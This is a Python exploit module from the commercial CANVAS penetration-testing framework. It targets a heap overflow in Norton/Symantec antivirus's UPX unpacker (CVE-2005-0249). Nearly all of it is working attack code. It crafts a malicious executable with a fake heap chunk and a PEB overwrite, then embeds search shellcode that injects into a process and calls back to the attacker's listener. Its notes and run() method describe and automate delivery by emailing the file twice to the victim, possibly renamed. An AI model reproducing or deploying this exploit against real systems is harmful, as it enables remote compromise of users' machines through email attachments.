#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path:
    sys.path.append(".")
from exploitutils import *
from tcpexploit import tcpexploit


NAME="norton_upx"
DESCRIPTION="Symantec/Norton UPX overflow."
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Symantec"
DOCUMENTATION["Repeatability"]="This is a one shot exploit, but the process won't crash."
DOCUMENTATION["VersionsAffected"]="Any 2004"
DOCUMENTATION["URL"]="http://xforce.iss.net/xforce/alerts/id/187"
DOCUMENTATION["URL2"]="http://www.symantec.com/avcenter/security/Content/2005.02.08.html"
DOCUMENTATION["CVE Name"] = "CVE-2005-0249"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0249"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["Found by"]="Alex Wheeler"
DOCUMENTATION["Released on"]="2/8/2005"


VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Client-side"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP" ]

NOTES="""
Our stragegy (not optimal): We get a reliable write4() and write into PEB.unlock and then
blindly jump to heap. In the heap we have our searchcode, which finds our real shellcode
which then injects into another process and calls back to us.

The process we're in has all sorts of privs enabled - almost as many as LSASS, and
you could theoretically inject into one of the sibling processes, since you know
their name, but our process inject shellcode wasn't successful for some reason,
even though we have system and debug is enabled. Worth a look later.

Attach to SAVScan.exe on Windows
Restarting Norton Antivirus Autoprotect Service may allow you to debug this

Probably the easiest way to debug this is to copy files
back and forth while modifying them.

Tag check at 69a7a3b4 (call this offset1)

Load our tag into esi at 69a7ab9b

PE\x00\x00 Check at 69a7ad15 (copy of 3e*2 bytes) (call this offset2)

If you pass the check then size is pulled from offset2+0x16
size=*(int*)(offset2+0x6) & 0xffff
size2=*(int*)(offset2+0x14) & 0xffff
size=size+size*4
size=size2+size*8+0x18
size=size/4 // shr ecx, 2
memcpy(dest,source,size)

Our actual block starts earlier with MZ header and is of size 0x1601
0x1601*8, really, and if you go to that address, you'll see
the next block
I.e. in my case, the block with MZ starts at 0x630040
and you can calculate the next block with
"%x"%(0x630040+0x1601*8) = 0x63b048
0x1601 is the same as 45064

Eax may actually have the address of the start block
when the memcpy occures

What we're actually affecting here is at 69a7ad0b, which is
a mov ecx, dword ptr ds:[esi+34] - we should have some
control over esi?

our A's can be found at 018B9AD0...is that always the case?

After our overflow:
    1. rtlalloc on some huge amount which fails
    2. 140000 of 21a
    3. 930000 of 104
    4. 930000 of 30
    5. 930000 of 4
    exception
    6. 140000 of 424
....
    5d0000 of 78,104
    
    This exploit creates a upxout.exe which you can copy twice onto your target.
    Once does the write4() and the second triggers the PEB.lock.
    
    To exploit this remotely you probably want to attach it to an email twice and run
    it that way. You can probably rename it to something else when you do so.
    
    Don't forget, the Symantec Appliances run on RedHat, not Windows, so this exploit
    won't work on them.
    
    The install file is available, but it will only install on XP for some reason. 
    
    emailsender is also useful. The gui for this exploit isn't done yet - but we can automatically send it.
"""

CHANGELOG="""

"""



class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.smtpport=25
        self.host=""
        self.shellcode="\xcc" * 298
        #hmm, according to 60074207 we only compare with 0, 0d 0a 3f 26 20
        #self.searchbadstring="%.,:;\x00\x0a\x0d+\"\x2f\x5c\x09\x0e\x0b =&~("
        self.searchbadstring="%\x00\x0a\x0d&?,\" "
        self.badstring=self.searchbadstring
        self.ssl=0
        self.setVersions()
        self.version=1
        self.email="dave@immunityinc.com"
        self.fromaddr = ""
        self.name=NAME        


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Windows XP",0x7ffdf024,0x005dc222)


    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        #need heapsafe shellcode first
        vname=self.versions[self.version][0]
        if vname.count("2003") or vname.count("XP"):
            pname="lsass.exe"
        else:
            #2000, although norton doesn't like to install on it
            pname="LSASS.EXE"
        pname="ccEvtMgr.exe" #Someday we'll figure out why this shellcode doens't work
        self.log("Injecting into process: %s"%pname)
        #hardcode badstring to "" in the heap shellcode, because we get encoded in
        #createWin32SearchShellcode()
        #shellcode=self.createHeapSafeInjectIntoProcess("", host, port, smallcode=1, processname=pname)
        shellcode=self.createHeapSafeInject("",host,port)
        #then make searchcode out of it
        return self.createWin32SearchShellcode(host,port,rawshellcode=shellcode)
    
    def test(self):
        """
        Hard to test for client side vulns...
        """
        return 0
    
    def run(self):
        self.host = self.target.interface #smtp host
        self.smtpport=int(self.argsDict.get("smtpport",self.smtpport))
        self.getarg("filename")
        self.getarg("email")
        self.getarg("fromaddr")
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        self.log("Attacking %s:%d"%(self.host,self.port))
        filedata = self.makesploit()
        
        if self.email:
            self.log("Sending file via email...")
            app=self.engine.getModuleExploit("emailsender")
            app.link(self)
            app.argsDict["port"]        = self.smtpport
            app.argsDict["attachments"] = {self.filename: {'data' : filedata}, self.filename+"2": {'data' : filedata}}
            app.argsDict["toaddr"]      = self.email
            app.argsDict["fromaddr"]    = self.fromaddr
            ret = app.run()
            
            if ret != 1:
                self.log("Could not send email - attack failed")
                return 0
            
            self.log("Sleeping for 5 seconds")
            import time
            time.sleep(5)
            ret = self.ISucceeded()

        else:
            self.log("You've chosen to deliver your file %s manually. Copy it or email it TWICE."%self.filename)
        ret = self.ISucceeded()
        return ret
        
    def makesploit(self):
        """
        Construct the attack
        """

        where=self.versions[self.version][1]
        what=self.versions[self.version][2]
        data=file("upxtestvuln.exe","rb").read()
        index=data.find(binstring("e2 d9 8d be"))
        if index==-1:
            self.log("Some kind of strange error finding tag!")
        index+=4 #skip tag
        #offset starts at 4100, and we can do up to that much
        #our "This program cannot be run in DOS mode" starts
        #at 172 bytes past esi. There's some wack-value here too,
        #hence the 92
        offset=172-4100-92-10 #make this point to the little COM header string
        data=stroverwrite(data,intel_order(offset),index) #negative offset

        size=0
        size2=0x1601*8-0x3d-0x8-0x8-0x14 #size of buffer - 0x40 for offset into the PE header
        offset2=80 - 10 #static spot in our PE header
        data=stroverwrite(data,"PE\x00\x00",offset2) #pass the PE check
        data=stroverwrite(data,intel_order(size),offset2+0x6)
        data=stroverwrite(data,intel_order(size2),offset2+0x14)
        #where=heapIndex(0x5d0000,0x104) #we use a non-default heap in msvcrt
        #what=0x7ffdf050
        #where=0x7ffdf024 #PEB.unlock
        #what=0x5daad0 #spot in heap we always are?
        #what=0x018bc726
        #what=0x5dc222 #find the eb06 and go there
        
        self.log("write4(%8.8x,%8.8x)"%(where,what))
        #here we create our fake chunk, oded style
        #03fe is the size of the next chunk, 1601 is our size, rest is flags
        chunk=binstring("f7 03 01 16") #size,size
        #chunk+=binstring("30 40 08 30") #flags
        chunk+=binstring("00 00 00 00") #flags
        #chunk=binstring("00 04 0116")+"X"*4 
        #chunk=binstring("00 00 0000")*2 

        chunk+=intel_order(what)+intel_order(where)
        data=stroverwrite(data,chunk,offset2+10*4-4)
        shellstring="\xeb\x06"*400+"A"*12+self.encodedsearchcode
        self.log("len encoded search code=%d / shellcode=%d"%(len(self.encodedsearchcode),len(self.shellcode)))
        shellstring+="AD"*7000+"A"*12+self.shellcode
        data=stroverwrite(data,shellstring,8208)
        sploitstring=data
        
        outname=self.filename
        if outname!="":
            self.log("Writing temporary file to %s"%outname)
            fdout=file(outname,"wb")
            fdout.write(sploitstring)
            fdout.close()
        
        return data




if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
